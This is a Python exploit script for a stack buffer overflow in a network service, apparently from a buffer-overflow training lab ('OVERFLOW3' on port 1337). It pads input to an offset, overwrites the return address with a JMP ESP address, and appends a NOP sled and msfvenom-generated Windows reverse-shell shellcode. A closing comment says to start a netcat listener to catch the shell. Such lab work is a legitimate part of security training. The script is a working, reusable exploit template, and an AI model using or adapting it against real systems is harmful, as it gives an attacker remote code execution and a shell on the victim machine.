#!/usr/bin/env python3

import socket
import struct


def p32(data):
	return struct.pack('<I', data)


host, port = "10.10.154.224", 1337 # CHANGE THIS.

all_chars = bytearray(range(1,256))

bad_chars = [ # CHANGE THIS.
	b"\x11",
	b"\x40",
	b"\x5f",
	b"\xb8",
	b"\xee",
]

for bad_char in bad_chars:
	all_chars = all_chars.replace(bad_char, b"")

command = b"OVERFLOW3 " # CHANGE THIS.
length = 1500 # CHANGE THIS.
offset = 1274 # CHANGE THIS.
jmp_esp = p32(0x62501205) # CHANGE THIS.

# msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=9001 -b "\x00\x07\x2e\xa0" -f py -v shellcode # CHANGE THIS.
shellcode =  b""
shellcode += b"\xfc\xbb\x7f\x18\x08\xb0\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x83\xf0\x8a\xb0\x7b\x01\xeb\x39"
shellcode += b"\x9e\x30\x2b\x5d\xeb\x63\x9b\x15\xb9\x8f\x50"
shellcode += b"\x7b\x29\x1b\x14\x54\x5e\xac\x93\x82\x51\x2d"
shellcode += b"\x8f\xf7\xf0\xad\xd2\x2b\xd2\x8c\x1c\x3e\x13"
shellcode += b"\xc8\x41\xb3\x41\x81\x0e\x66\x75\xa6\x5b\xbb"
shellcode += b"\xfe\xf4\x4a\xbb\xe3\x4d\x6c\xea\xb2\xc6\x37"
shellcode += b"\x2c\x35\x0a\x4c\x65\x2d\x4f\x69\x3f\xc6\xbb"
shellcode += b"\x05\xbe\x0e\xf2\xe6\x6d\x6f\x3a\x15\x6f\xa8"
shellcode += b"\xfd\xc6\x1a\xc0\xfd\x7b\x1d\x17\x7f\xa0\xa8"
shellcode += b"\x83\x27\x23\x0a\x6f\xd9\xe0\xcd\xe4\xd5\x4d"
shellcode += b"\x99\xa2\xf9\x50\x4e\xd9\x06\xd8\x71\x0d\x8f"
shellcode += b"\x9a\x55\x89\xcb\x79\xf7\x88\xb1\x2c\x08\xca"
shellcode += b"\x19\x90\xac\x81\xb4\xc5\xdc\xc8\xd0\x2a\xed"
shellcode += b"\xf2\x20\x25\x66\x81\x12\xea\xdc\x0d\x1f\x63"
shellcode += b"\xfb\xca\x60\x5e\xbb\x44\x9f\x61\xbc\x4d\x64"
shellcode += b"\x35\xec\xe5\x4d\x36\x67\xf5\x72\xe3\x28\xa5"
shellcode += b"\xdc\x5c\x89\x15\x9d\x0c\x61\x7f\x12\x72\x91"
shellcode += b"\x80\xf8\x1b\x38\x7b\x6b\x2e\xb6\xbb\xb4\x46"
shellcode += b"\xca\xbb\x69\xbe\x43\x5d\x07\xd0\x05\xf6\xb0"
shellcode += b"\x49\x0c\x8c\x21\x95\x9a\xe9\x62\x1d\x29\x0e"
shellcode += b"\x2c\xd6\x44\x1c\xd9\x16\x13\x7e\x4c\x28\x89"
shellcode += b"\x16\x12\xbb\x56\xe6\x5d\xa0\xc0\xb1\x0a\x16"
shellcode += b"\x19\x57\xa7\x01\xb3\x45\x3a\xd7\xfc\xcd\xe1"
shellcode += b"\x24\x02\xcc\x64\x10\x20\xde\xb0\x99\x6c\x8a"
shellcode += b"\x6c\xcc\x3a\x64\xcb\xa6\x8c\xde\x85\x15\x47"
shellcode += b"\xb6\x50\x56\x58\xc0\x5c\xb3\x2e\x2c\xec\x6a"
shellcode += b"\x77\x53\xc1\xfa\x7f\x2c\x3f\x9b\x80\xe7\xfb"
shellcode += b"\xab\xca\xa5\xaa\x23\x93\x3c\xef\x29\x24\xeb"
shellcode += b"\x2c\x54\xa7\x19\xcd\xa3\xb7\x68\xc8\xe8\x7f"
shellcode += b"\x81\xa0\x61\xea\xa5\x17\x81\x3f\xa5\x97\x7d"
shellcode += b"\xc0"

nop_sled = b"\x90" * 16

payload = b"".join(
	[
		command,
		b"A" * offset,
		jmp_esp,
		nop_sled,
		shellcode,
		b"C" * (length - len(jmp_esp) - offset - len(nop_sled) - len(shellcode)),
	]
)

with socket.socket() as s:
	s.connect((host, port))
	s.send(payload)


# nc -nlvp 9001 before exec
